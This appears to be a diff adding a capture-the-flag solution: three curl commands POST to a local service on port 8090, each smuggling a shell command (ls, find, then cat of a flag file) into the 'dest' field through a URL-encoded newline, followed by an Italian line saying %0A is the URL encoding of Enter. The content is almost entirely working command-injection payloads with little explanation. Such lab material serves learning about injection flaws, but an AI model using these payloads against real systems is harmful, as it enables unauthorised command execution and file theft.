@@ -1,0 +1,7 @@
+curl -X POST -d "dest=127.0.0.1%0als" http://127.0.0.1:8090
+
+curl -X POST -d "dest=127.0.0.1%0afind" http://127.0.0.1:8090
+
+curl -X POST -d "dest=127.0.0.1%0acat<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag" http://127.0.0.1:8090
+
+%0A è la codifica URL del pulsante Invio.
